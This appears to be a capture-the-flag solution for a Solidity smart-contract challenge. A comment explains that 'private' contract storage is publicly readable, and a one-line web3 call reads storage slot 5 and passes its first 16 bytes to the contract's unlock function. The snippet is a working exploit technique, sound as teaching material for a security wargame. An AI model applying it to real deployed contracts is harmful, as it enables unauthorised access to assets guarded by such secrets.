/*
	At contract creation, the data is stored in the contract's storage (which is public since it's on the blockchain).
	To unlock, we just need to read the value evalutated as 'bytes16(data[2])' which corresponds to the first 16 bytes (solidity is big endian for handling bytes objects) of the last data element in storage. 
*/
await contract.unlock((await web3.eth.getStorageAt(contract.address, 5)).substring(0, 34))